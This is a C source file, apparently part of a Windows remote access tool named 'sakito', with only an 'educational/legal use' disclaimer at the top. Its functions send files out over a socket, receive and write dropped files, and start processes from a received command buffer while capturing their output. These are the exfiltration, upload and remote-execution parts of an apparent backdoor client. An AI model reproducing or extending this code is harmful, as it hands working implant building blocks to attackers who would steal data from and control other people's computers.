/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#include <ws2tcpip.h>
#include <fileapi.h>
#include <stdint.h>
#include <string.h>
#include "../headers/nbo_encoding.h"
#include "../headers/sakito_core_funcs.h"
#include "../headers/os_check.h"
#include "../headers/windows/sakito_swin_types.h"
#include "../headers/sakito_multi_def.h"

HANDLE s_win_openf(const LPCTSTR filename, const DWORD desired_access, const DWORD creation_disposition) 
{
	return CreateFile(filename,
			desired_access,
			0,
			NULL,
			creation_disposition,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
}

uint64_t s_win_fsize(HANDLE h_file) 
{
   	// Get file size and serialize file size bytes.
	LARGE_INTEGER largeint_struct;
	GetFileSizeEx(h_file, &largeint_struct);
	return (uint64_t)largeint_struct.QuadPart;
}

// Function for sending file to client (TCP file transfer).
int s_win_sendf(const SOCKET socket, HANDLE h_file, char* const buf, uint64_t f_size) 
{
	uint64_t f_size_bytes = htonll(f_size);

	// Send serialized file size uint64_t bytes to server.
	if (send(socket, (char*)&f_size_bytes, sizeof(uint64_t), 0) < 1)
		return SOCKET_ERROR;

	int i_result = SUCCESS;

	if (f_size > 0) 
	{
		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
		DWORD bytes_read;
		while ((i_result > 0) &&
			(ReadFile(h_file, buf, BUFLEN, &bytes_read, NULL)) &&
			(bytes_read != 0))
			i_result = send(socket, buf, bytes_read, 0);
	}

	// Close the file.
	CloseHandle(h_file);

	return i_result;
}

// Function to receive file from client (TCP file transfer).
int s_win_recvf(const SOCKET socket, HANDLE h_file, char* const buf, uint64_t f_size) 
{
	int i_result = 1;

	if (f_size > 0)
	{
		// Receive all file bytes/chunks and write to parsed filename.
		DWORD bytes_written;

		do
			i_result = recv(socket, buf, BUFLEN, 0);
		while ((i_result > 0) &&
			(WriteFile(h_file, buf, i_result, &bytes_written, NULL)) &&
			(f_size -= bytes_written));
	}

	return i_result;
}

BOOL s_win_cp(HANDLE child_stdout_write, const LPSTR buf)
{
	// Create a child process that uses the previously created pipes for STDIN and STDOUT.
	PROCESS_INFORMATION pi; 
	STARTUPINFO si;
	memset(&pi, 0, sizeof(pi));
	memset(&si, 0, sizeof(si));

	if (child_stdout_write) 
	{
		si.cb = sizeof(STARTUPINFO);
		si.hStdError = child_stdout_write;
		si.hStdOutput = child_stdout_write;
		si.dwFlags |= STARTF_USESTDHANDLES;
	}

	// Create the child process.
	BOOL i_result = CreateProcess(NULL, 
					buf,
					NULL,
					NULL,
					TRUE,
					0,
					NULL,
					NULL,
					&si,
					&pi);

	if (i_result && !child_stdout_write)
		// Wait until child process exits.
		WaitForSingleObject(pi.hProcess, INFINITE);
	else
		CloseHandle(child_stdout_write);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return i_result;
}
